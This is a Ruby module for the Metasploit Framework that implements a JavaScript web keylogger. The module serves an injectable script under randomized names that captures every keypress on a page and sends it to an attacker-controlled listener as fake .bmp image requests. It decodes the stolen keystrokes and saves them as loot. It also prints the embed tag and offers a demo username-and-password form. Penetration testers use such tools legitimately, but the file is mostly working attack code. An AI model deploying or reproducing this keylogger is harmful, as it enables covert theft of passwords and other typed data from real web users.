#
# $Id:  $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML

        def initialize(info = {})
                super(update_info(info,
			'Name'           => 'Metasploit JavaScript Keylogger',
			'Description'    => %q{
					This modules runs a HTTP Server to serve as a remote keylog listener
					to capture web page keystrokes.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>  ['Marcus J. Carey <mjc[at]threatagent.com>'],
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'URL', 'http://www.metasploit.com'],
				]))
                	register_options(
                        [
                                OptString.new('SRVHOST', [true, "Local HTTP Server IP Address", "#{Rex::Socket.source_address}"]),	
                                OptInt.new('SRVPORT', [true, "Local HTTP Server Port",80]),
                                OptBool.new('DEMO', [true, "Create a Demo Keylogger Page",false]),
                                OptString.new('URIPATH', [true, "Recommended value is \"\/\"","/"]),
                        ], self.class)
        end
	
	# This is the Demo Form Page <HTML>
	def demo
		html = <<EOS
<html>
<head>
<title>Metasploit JavaScript Keylogger Demonstration Form</title>
<script type="text/javascript" src="#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{@random_text}.js"></script>
</head>
<body bgcolor="white">
<br><br>
<div align="center"> 
<h1>Metasploit<br>Javascript Keylogger Demo</h1>
<form method=\"POST\" name=\"logonf\" action=\"#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/metasploit\">
<p><font color="red"><i>This form submits data to the Metasploit listener <br>at #{datastore['SRVHOST']}:#{datastore['SRVPORT']} for demonstration purposes.</i></font>
<br><br>
<table border="0" cellspacing="0" cellpadding="0"> 
<tr><td>Username:</td> <td><input name="userf" size="20"></td> </tr>
<tr><td>Password:</td> <td><input type="password" name="passwordf" size="20"></td> </tr>
</table>
<p align="center"><input type="submit" value="Submit"></p></form>
<p><font color="grey" size="2">Metasploit&reg; is a registered trademark of Rapid7, Inc.</font>
</div>
</body>			
</html>
EOS
		return html
	end
	
	# This is the JavaScript Key Logger Code
	def keylogger
		code = <<EOS
window.onload = function load#{@random_text}(){
	l#{@random_text} = ",";
	document.onkeypress = p#{@random_text};
	document.onkeydown = d#{@random_text};
}
function p#{@random_text}(e){
	k#{@random_text} = window.event.keyCode;
	k#{@random_text} = k#{@random_text}.toString(16);
	if (k#{@random_text} != "d"){	
		#{@random_text}(k#{@random_text});
	}
}
function d#{@random_text}(e){
	k#{@random_text} = window.event.keyCode;
	if (k#{@random_text} == 9 || k#{@random_text} == 8 || k#{@random_text} == 13){
		#{@random_text}(k#{@random_text});
	}
}
function #{@random_text}(k#{@random_text}){
	l#{@random_text} = l#{@random_text} + k#{@random_text} + ",";
	if (window.XMLHttpRequest){
		xmlhttp=new XMLHttpRequest();
	}
	else{
  		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  	}
	xmlhttp=new XMLHttpRequest();
	xmlhttp.open("GET","#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{@random_text}.bmp&[" + l#{@random_text} + "]",true);
	xmlhttp.send();
}
EOS
		return code
	end
	
	def hex_to_s(log)
		@ascii_log = ""
		log.split(",").each do |char|
			case char.to_i
				# Do Backspace
				when 8
					if @ascii_log.present?
						if @ascii_log[@ascii_log.length - 4,@ascii_log.length] == "<CR>"
							@ascii_log = @ascii_log[0, @ascii_log.length - 4]
						elsif @ascii_log[@ascii_log.length - 5,@ascii_log.length] == "<TAB>"
							@ascii_log = @ascii_log[0, @ascii_log.length - 5]
						else
							@ascii_log = @ascii_log[0, @ascii_log.length - 1]
						end
					end

				when 9  then @ascii_log += "<TAB>"
				when 13  then @ascii_log += "<CR>"

				else
					@ascii_log += char.to_s.hex.chr
				end
		end	
	end

	# Creates Metasploit shield favicon
	def favicon
		ico =  "000001000100101000000000000068050000160000002800000010000000200000000100"
		ico << "080000000000000100000000000000000000000100000000000000000000C5BDB5005534"
		ico << "1100FFFFFF002D1803006034060044250400673807004B290500D9D9D9004D2A05002515"
		ico << "040000000000000000000000"
		ico << "00" * 81 * 12 
		ico << "000707000000000000000000000000000707070A00000000000000000000000707070A0A"
		ico << "0A000000000000000000070707070A0A0A0A0000000000000007030707070A0A0A010A00"
		ico << "000000000707030707070A0A0A09020A00000000070303070703090A0A09090A00000000"
		ico << "070303070703090A0A09090A0000000007030307050309080A09090A0000000007030307"
		ico << "070309040609090A0000000007030307030309090B09090A000000000703030303030909"
		ico << "0909090A000000000703030303070A090909090A000000000703030307070A0A0909090A"
		ico << "000000000707070707070A0A0A0A0A0A000000000007070707070A0A0A0A0A000000FE7F"
		ico << "0000FC3F0000F81F0000F00F0000E0070000C0030000C0030000C0030000C0030000C003"
		ico << "0000C0030000C0030000C0030000C0030000C0030000E0070000"
		ico = [ico].pack("H*")
		return ico
	end	

	# Creates a BMP image to make the requester happy
	def img
		bmp  = '424D42000000000000003E00000028000000010000000100'
		bmp << '000001000100000000000400000000000000000000000000'
		bmp << '00000000000000000000FFFFFF0080000000'
		bmp = [bmp].pack("H*")
		return bmp
	end

	# This handles reporting to the database
	def cleanup
		super
		path = store_loot("javascript.keystrokes", "text/plain", @host, @loot)
		print_status("Stored loot at #{path}")
	end

	def current_time
		return Time.new.utc.strftime("[%d/%b/%Y:%H:%M:%S %Z]")
	end

	# Creates and prints timestamp
	def request_timestamp(cli,request)
		print_status("#{cli.peerhost} - #{current_time} - [HTTP GET] - #{request.uri}")
	end

	# This handles the HTTP responses for the Web server
        def on_request_uri(cli, request)
		@host = cli.peerhost

		# Reply with JavaScript Source if *.js is requested
		if request.uri =~ /\.js/
			content_type = "text/plain"
			content = keylogger
			send_response(cli, content, {'Content-Type'=> content_type})
			request_timestamp(cli,request)
		
		# JavaScript HTTP Image GET Request is used for sending the keystrokes over network.  
		elsif request.uri =~ /\.bmp/
			content = img
			content_type = "image/bmp"
    			send_response(cli, content, {'Content-Type'=> content_type})
			log = request.uri.split("\.bmp&")[1]
			hex_to_s(log)
			@loot <<  "#{cli.peerhost} - #{current_time} - " + @ascii_log + "\r\n"
			if log.length > 1 
				print_good("#{cli.peerhost} - #{current_time} - [KEYLOG] - #{@ascii_log}")
			end

		# Reply with Metasploit Shield Favicon
		elsif request.uri =~ /favicon\.ico/
			content = favicon
			content_type = "image/icon"
    			send_response(cli, content, {'Content-Type'=> content_type})
			request_timestamp(cli,request)

		# Reply with Demo Page
		elsif request.uri =~ /metasploit/ and datastore['DEMO']
			content = demo
			content_type = "text/html"
    			send_response(cli, content, {'Content-Type'=> content_type})
			request_timestamp(cli,request)
		else
			# Reply with 404 - Content Not Found
			content = "Error 404 (Not Found)!"
			send_response(cli, "<html><title>#{content}</title><h1>#{content}</h1></html>", {'Content-Type' => 'text/html'})
		end
        end

	def use_ssl?
		if datastore['SSL']
			@http_mode = "https://"
		else
			@http_mode = "http://"
		end
	end
	
	def start_log
		@loot = ""
		logo = %Q{
			# cowsay++
			 _________________________________
			< metasploit javascript keylogger >
			 ---------------------------------
			  \\   ,__,
			   \\  (oo)____
			      (__)    )\\
			         ||--|| *
			^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
			Started at #{current_time}
			=====================================
			
			}
		logo = logo.gsub("\t\t\t","")

		@loot << logo

	end
	# This is the module's main runtime method
        def run
		start_log
 		use_ssl?
		@ascii_log = ""
		@random_text = Rex::Text.rand_text_alpha(12)
		script_source = "#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/js#{@random_text}.js"

		# Prints Demo Page
		if datastore['DEMO']
			print_status("Demonstration Form URL => %grn#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/metasploit%clr")
		end

		# Prints HTML Embed Code
		print_status(" Keylogger <HTML> Code => %blu<script type=\"text/javascript\" src=\"#{script_source}\"></script>%clr")

		# Starts Web Server
		exploit
        end
end
